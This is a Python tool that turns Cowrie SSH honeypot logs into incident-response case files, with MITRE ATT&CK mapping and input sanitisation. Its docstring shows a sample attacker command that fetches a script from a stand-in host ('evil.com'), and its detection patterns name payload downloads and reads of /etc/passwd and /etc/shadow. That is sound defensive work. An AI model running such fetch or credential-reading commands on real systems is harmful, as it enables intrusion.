#!/usr/bin/env python3
"""
26_incident_timeline_live.py

THIR LIVE PIPELINE — PRODUCTION TOOL
Adapted from: InfraReadyPortfolio/06_soc_collaboration_tools/26_incident_timeline_generator/

CHANGES FROM ORIGINAL (incident_timeline_generator.py):
  1. Input changed from plaintext ISO-timestamp logs → Cowrie NDJSON (newline-delimited JSON)
  2. parse_timestamp_from_line() → parse_cowrie_event() reads JSON eventid/timestamp/src_ip
  3. read_and_collect_logs() → read_cowrie_logs() groups raw events into sessions by session ID
  4. sort_log_entries() preserved — sorts sessions by first_seen timestamp (unchanged logic)
  5. output_csv() → output_ir_cases_json() writes structured IR case objects
  6. Added build_ir_case() — assembles one IR case dict per attacker session
  7. Added TTP_MAP — eventid + command pattern → MITRE ATT&CK technique IDs
  8. Added map_ttps() — walks session events, returns deduplicated TTP list
  9. Added --output flag (was stdout-only in original)
  10. All original logging helpers, fatal_error, VERBOSE pattern preserved unchanged

SECURITY PATCHES (Exposure of Authority — Adam Shostack):
  P1. sanitise_session_id() — strips non-hex chars from session_id before use in case_id
      Prevents path traversal or injection if Cowrie log is tampered on a compromised VPS.
  P2. sanitise_ip() — validates src_ip via ipaddress module before passing to output
      Prevents attacker-crafted strings from directing Tool 27 / AbuseIPDB API calls.
  P3. Glob path constrained to /tmp/ prefix — prevents accidental wide-glob traversal
      if tool is run manually with a careless pattern.
  P4. Command strings truncated to MAX_CMD_LEN (512 chars) — prevents bloated JSON output
      from an attacker pasting large payloads into the Cowrie shell.

ROLE IN THIR PIPELINE:
  Reads /tmp/cowrie.json (fetched from Oracle VPS by GitHub Actions).
  Groups events by session ID → builds one IR case per attacker session.
  Writes data/ir_cases.json → portfolio IR case timeline reads it live.

GITHUB ACTIONS USAGE:
  python tools/26_incident_timeline_live.py \
    --input-glob "/tmp/cowrie*.json" \
    --output data/ir_cases.json

OUTPUT FORMAT (data/ir_cases.json):
  {
    "generated_at": "2025-01-15T11:00:00Z",
    "total_cases": 3,
    "cases": [
      {
        "case_id": "IR-abc123def456",
        "src_ip": "185.220.101.5",
        "first_seen": "2025-01-15T10:23:45Z",
        "last_seen":  "2025-01-15T10:24:12Z",
        "duration_seconds": 27,
        "login_attempts": 12,
        "login_success": false,
        "commands": ["whoami", "wget http://evil.com/bot.sh"],
        "downloads": [{"url": "http://evil.com/bot.sh", "sha256": "deadbeef..."}],
        "ttps": ["T1110.001", "T1059.004", "T1105"],
        "severity": "HIGH",
        "timeline": [
          {"timestamp": "2025-01-15T10:23:45Z", "event": "cowrie.session.connect"},
          ...
        ]
      }
    ]
  }
"""

import sys
import json
import argparse
import glob
import ipaddress  # P2: IP validation
import os         # P3: path constraint
import re
from datetime import datetime, timezone
from typing import List, Dict, Optional, Any


# -----------------------------
# Logging helpers (unchanged from original)
# -----------------------------

VERBOSE = False


def log_info(message: str) -> None:
    if VERBOSE:
        print(f"[INFO] {message}", file=sys.stderr)


def log_warning(message: str) -> None:
    print(f"[WARNING] {message}", file=sys.stderr)


def log_error(message: str) -> None:
    print(f"[ERROR] {message}", file=sys.stderr)


def fatal_error(message: str, exit_code: int = 1) -> None:
    log_error(message)
    sys.exit(exit_code)


# -----------------------------
# P1: Session ID sanitisation
# Cowrie session IDs are lowercase hex strings (e.g. "a3b1c2d4e5f6").
# Strip anything that isn't [a-f0-9] and cap at 32 chars to prevent
# path traversal or injection if the Cowrie log is tampered upstream.
# -----------------------------

def sanitise_session_id(raw: str) -> str:
    """
    Return only the hex portion of a Cowrie session ID, max 32 chars.
    Falls back to 'unknown' if nothing valid remains.
    """
    cleaned = re.sub(r'[^a-f0-9]', '', raw.lower())[:32]
    return cleaned if cleaned else "unknown"


# -----------------------------
# P2: IP address sanitisation
# Validates src_ip via Python's ipaddress module before it reaches
# the output JSON and downstream Tool 27 / AbuseIPDB API calls.
# Accepts both IPv4 and IPv6. Returns "unknown" for anything invalid.
# -----------------------------

def sanitise_ip(raw: str) -> str:
    """
    Validate and normalise an IP address string.
    Returns the canonical string form, or 'unknown' if invalid.
    """
    try:
        return str(ipaddress.ip_address(raw.strip()))
    except ValueError:
        log_warning(f"Invalid src_ip value rejected: {raw!r}")
        return "unknown"


# -----------------------------
# P4: Command length cap
# Prevents a single oversized attacker payload from bloating
# data/ir_cases.json (served publicly via GitHub Pages).
# -----------------------------

MAX_CMD_LEN = 512


# -----------------------------
# MITRE ATT&CK TTP mapping
# eventid and command patterns → technique IDs
# -----------------------------

TTP_MAP = {
    # Event-based mappings
    "cowrie.login.failed":          "T1110.001",  # Brute Force: Password Guessing
    "cowrie.login.success":         "T1078",       # Valid Accounts
    "cowrie.session.file_download": "T1105",       # Ingress Tool Transfer
    "cowrie.session.file_upload":   "T1105",       # Ingress Tool Transfer
    "cowrie.client.version":        "T1592",       # Gather Victim Host Information
}

# Command pattern → TTP (checked against cowrie.command.input events)
COMMAND_TTP_PATTERNS = [
    (re.compile(r'\bwget\b|\bcurl\b|\bfetch\b'),            "T1105"),    # Ingress Tool Transfer
    (re.compile(r'\bchmod\b.*\+x'),                          "T1222.002"), # File Permissions Modification
    (re.compile(r'/etc/passwd|/etc/shadow'),                  "T1003.008"), # OS Credential Dumping
    (re.compile(r'\bcrontab\b|/etc/cron|rc\.local'),         "T1053.003"), # Scheduled Task: Cron
    (re.compile(r'\buseradd\b|\badduser\b'),                 "T1136.001"), # Create Account: Local Account
    (re.compile(r'\biptables\b|\bufw\b|\bnftables\b'),       "T1562.004"), # Disable/Modify System Firewall
    (re.compile(r'\bps\b|\bnetstat\b|\bss\b|\bwho\b|\bw\b'), "T1057"),    # Process Discovery
    (re.compile(r'\bcat\b|\bmore\b|\bless\b|\bhead\b|\btail\b'), "T1083"), # File and Directory Discovery
    (re.compile(r'\bssh\b|\bscp\b|\brsync\b'),               "T1021.004"), # Remote Services: SSH
    (re.compile(r'\bpython\b|\bperl\b|\bruby\b|\bphp\b|\bbash\b|\bsh\b'), "T1059.004"), # Unix Shell
    (re.compile(r'\bnmap\b|\bmasscan\b|\bscan\b'),            "T1046"),    # Network Service Discovery
    (re.compile(r'\bbase64\b|\bhex\b|\bopenssl\b'),           "T1027"),    # Obfuscated Files or Information
    (re.compile(r'\bkill\b|\bpkill\b|\bstop\b'),              "T1489"),    # Service Stop
]


def map_ttps(events: List[Dict]) -> List[str]:
    """
    Walk all events in a session and return a deduplicated, sorted TTP list.
    Checks both eventid-based and command-pattern-based mappings.
    """
    found = set()

    for event in events:
        eventid = event.get("eventid", "")

        # Direct eventid mapping
        if eventid in TTP_MAP:
            found.add(TTP_MAP[eventid])

        # Command pattern matching for cowrie.command.input events
        if eventid == "cowrie.command.input":
            cmd = event.get("input", "")
            for pattern, ttp in COMMAND_TTP_PATTERNS:
                if pattern.search(cmd):
                    found.add(ttp)

    return sorted(found)


# -----------------------------
# Severity scoring
# -----------------------------

def calculate_severity(case: Dict) -> str:
    """
    Assign severity based on observable session characteristics.
    HIGH: successful login or file download present
    MEDIUM: commands executed after login attempts
    LOW: pure brute force with no success
    """
    if case.get("login_success") or case.get("downloads"):
        return "HIGH"
    if case.get("commands"):
        return "MEDIUM"
    return "LOW"


# -----------------------------
# Cowrie-specific parsing (replaces parse_timestamp_from_line)
# -----------------------------

def parse_cowrie_event(line: str) -> Optional[Dict]:
    """
    Parse one line of Cowrie NDJSON into a dict.
    Returns None if line is empty, malformed, or missing required fields.

    Replaces original parse_timestamp_from_line() — same role, Cowrie-aware.
    """
    line = line.strip()
    if not line:
        return None
    try:
        event = json.loads(line)
    except json.JSONDecodeError:
        return None

    # Require at minimum: eventid, session, timestamp
    if not all(k in event for k in ("eventid", "session", "timestamp")):
        return None

    return event


def read_cowrie_logs(files: List[str]) -> Dict[str, List[Dict]]:
    """
    Read Cowrie NDJSON files and group events by session ID.
    Returns: {session_id: [event, event, ...]}

    Replaces original read_and_collect_logs() — same multi-file iteration
    and error handling pattern, adapted for JSON line parsing.
    """
    sessions: Dict[str, List[Dict]] = {}

    for file_path in files:
        log_info(f"Processing file: {file_path}")
        try:
            with open(file_path, "r", encoding="utf-8", errors="replace") as fh:
                for line_number, line in enumerate(fh, start=1):
                    event = parse_cowrie_event(line)
                    if event is None:
                        log_warning(
                            f"Skipped line {line_number} in {file_path}: "
                            "Not valid Cowrie JSON or missing required fields"
                        )
                        continue
                    session_id = event["session"]
                    sessions.setdefault(session_id, []).append(event)

        except FileNotFoundError:
            log_error(f"File not found: {file_path}")
        except PermissionError:
            log_error(f"Permission denied when reading file: {file_path}")
        except OSError as exc:
            log_error(f"OS error while reading {file_path}: {exc}")

    if not sessions:
        fatal_error("No valid Cowrie sessions found in input files.")

    log_info(f"Collected {len(sessions)} unique session(s)")
    return sessions


# -----------------------------
# IR case assembly
# -----------------------------

def build_ir_case(session_id: str, events: List[Dict]) -> Dict[str, Any]:
    """
    Assemble one IR case dict from all events in a session.
    Extracts: IP, timestamps, login stats, commands, downloads, TTPs, severity.

    Security patches applied:
      - P1: session_id sanitised before use in case_id
      - P2: src_ip validated via ipaddress before inclusion in output
      - P4: command strings truncated to MAX_CMD_LEN
    """
    # Sort events chronologically within this session
    events_sorted = sorted(events, key=lambda e: e.get("timestamp", ""))

    # P1: sanitise session_id before embedding in case_id
    safe_session_id = sanitise_session_id(session_id)

    # P2: validate src_ip before it propagates to output and Tool 27
    raw_ip   = next((e.get("src_ip", "") for e in events_sorted if e.get("src_ip")), "")
    src_ip   = sanitise_ip(raw_ip) if raw_ip else "unknown"

    first_seen   = events_sorted[0].get("timestamp", "") if events_sorted else ""
    last_seen    = events_sorted[-1].get("timestamp", "") if events_sorted else ""

    # Duration from session.closed event if available, else estimate from timestamps
    duration_seconds = 0
    for e in events_sorted:
        if e.get("eventid") == "cowrie.session.closed":
            duration_seconds = int(e.get("duration", 0))
            break

    login_attempts = sum(1 for e in events_sorted if e.get("eventid") in
                         ("cowrie.login.failed", "cowrie.login.success"))
    login_success  = any(e.get("eventid") == "cowrie.login.success" for e in events_sorted)

    # P4: cap each command string at MAX_CMD_LEN to prevent JSON bloat
    commands = [
        e["input"][:MAX_CMD_LEN]
        for e in events_sorted
        if e.get("eventid") == "cowrie.command.input" and e.get("input")
    ]

    downloads = [
        {"url": e.get("url", ""), "sha256": e.get("shasum", "")}
        for e in events_sorted
        if e.get("eventid") == "cowrie.session.file_download"
    ]

    ttps     = map_ttps(events_sorted)

    timeline = [
        {"timestamp": e.get("timestamp", ""), "event": e.get("eventid", "")}
        for e in events_sorted
    ]

    case = {
        "case_id":          f"IR-{safe_session_id}",   # P1 applied
        "src_ip":           src_ip,                     # P2 applied
        "first_seen":       first_seen,
        "last_seen":        last_seen,
        "duration_seconds": duration_seconds,
        "login_attempts":   login_attempts,
        "login_success":    login_success,
        "commands":         commands,                   # P4 applied
        "downloads":        downloads,
        "ttps":             ttps,
        "severity":         "",   # filled after
        "timeline":         timeline,
    }
    case["severity"] = calculate_severity(case)
    return case


# -----------------------------
# Output (replaces output_csv)
# -----------------------------

def output_ir_cases_json(cases: List[Dict], output_path: str) -> None:
    """
    Write structured IR cases to JSON file for portfolio dashboard.
    Replaces original output_csv() — same role, JSON output for live pipeline.
    """
    payload = {
        "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "total_cases":  len(cases),
        "cases":        cases,
    }

    try:
        with open(output_path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
        log_info(f"IR cases written to {output_path}")
    except OSError as exc:
        fatal_error(f"Failed to write output file {output_path}: {exc}")


# -----------------------------
# Argument parsing (extended from original)
# -----------------------------

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Parse Cowrie honeypot JSON logs into structured IR cases."
    )
    parser.add_argument(
        "--input-glob",
        required=True,
        help='Glob pattern to locate Cowrie JSON log files (e.g., "/tmp/cowrie*.json")',
    )
    parser.add_argument(
        "--output",
        required=True,
        help="Path to write IR cases JSON output (e.g., data/ir_cases.json)",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose informational output to stderr",
    )
    return parser.parse_args()


# -----------------------------
# Entry point
# -----------------------------

def main() -> None:
    global VERBOSE

    args = parse_arguments()
    VERBOSE = args.verbose

    log_info("Incident Timeline Generator (Cowrie Live) started")

    # discover_log_files() logic preserved from original — same glob pattern approach
    all_matches = glob.glob(args.input_glob)

    # P3: constrain resolved paths to /tmp/ to prevent accidental wide-glob traversal
    files = [
        f for f in all_matches
        if os.path.abspath(f).startswith('/tmp/')
    ]

    rejected = len(all_matches) - len(files)
    if rejected:
        log_warning(f"P3: {rejected} file(s) outside /tmp/ were rejected by path constraint.")

    if not files:
        fatal_error(f"No files matched the glob pattern within /tmp/: {args.input_glob}")

    log_info(f"Discovered {len(files)} file(s)")

    # Read and group by session (replaces read_and_collect_logs)
    sessions = read_cowrie_logs(files)

    # Build IR case per session
    cases = [build_ir_case(sid, events) for sid, events in sessions.items()]

    # Sort by first_seen chronologically (sort_log_entries logic preserved)
    cases.sort(key=lambda c: c.get("first_seen", ""))

    log_info(f"Built {len(cases)} IR case(s)")

    # Write JSON output (replaces output_csv)
    output_ir_cases_json(cases, args.output)

    log_info("Incident Timeline Generator completed successfully")


if __name__ == "__main__":
    main()
